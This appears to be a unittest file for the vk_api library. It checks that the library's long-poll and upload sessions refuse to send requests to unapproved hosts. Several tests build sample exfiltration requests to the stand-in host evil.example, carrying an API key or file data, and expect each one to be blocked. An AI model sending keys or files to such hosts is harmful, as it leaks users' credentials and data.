import unittest
from unittest.mock import patch

import requests
from vk_api import VkApi, VkUpload
from vk_api.bot_longpoll import VkBotLongPoll
from vk_api.longpoll import VkLongPoll
from vk_api.secure_transport import SafeSession


class LegacyTransportTests(unittest.TestCase):
    def test_user_longpoll_cannot_send_key_to_unapproved_host(self):
        with patch.object(VkLongPoll, 'update_longpoll_server'):
            poll = VkLongPoll(VkApi())
        self.addCleanup(poll.session.close)
        self.assertIsInstance(poll.session, SafeSession)
        request = requests.Request('GET', 'https://evil.example/?key=FAKE_KEY').prepare()
        with self.assertRaises(ValueError):
            poll.session.send(request)

    def test_bot_longpoll_cannot_send_key_to_unapproved_host(self):
        with patch.object(VkBotLongPoll, 'update_longpoll_server'):
            poll = VkBotLongPoll(VkApi(), group_id=1)
        self.addCleanup(poll.session.close)
        self.assertIsInstance(poll.session, SafeSession)
        request = requests.Request('GET', 'https://evil.example/?key=FAKE_KEY').prepare()
        with self.assertRaises(ValueError):
            poll.session.send(request)

    def test_upload_cannot_send_files_to_unapproved_host(self):
        upload = VkUpload(VkApi())
        self.addCleanup(upload.http.close)
        self.assertIsInstance(upload.http, SafeSession)
        request = requests.Request('POST', 'https://evil.example/', data=b'FAKE_FILE').prepare()
        with self.assertRaises(ValueError):
            upload.http.send(request)

    def test_audio_module_is_importable(self):
        # Integration smoke check: the audio parser's optional dependency ships.
        from vk_api.audio import VkAudio
        self.assertTrue(callable(VkAudio))
